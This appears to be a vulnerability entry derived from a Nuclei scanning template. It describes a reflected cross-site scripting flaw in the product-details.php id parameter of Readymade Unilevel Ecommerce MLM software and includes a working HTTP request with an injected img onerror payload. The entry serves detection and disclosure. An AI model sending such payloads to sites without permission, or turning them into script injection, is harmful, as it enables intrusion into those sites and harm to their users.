# Vulnerability: Readymade Unilevel Ecommerce MLM - Cross-Site Scripting
**Classification:** ECOMMERCE
**Source:** Nuclei Template (`readymade-unilevel-xss.yaml`)

## Description
Readymade Unilevel Ecommerce software has xss vulnerability in product-details.php?id

## Vulnerable Code Pattern / Exploit Payload
```http
GET /product-details.php?id=1"><img/src/onerror=.1|alert`{{num1}}`+class={{num1}}> HTTP/1.1
Host: {{Hostname}}
```

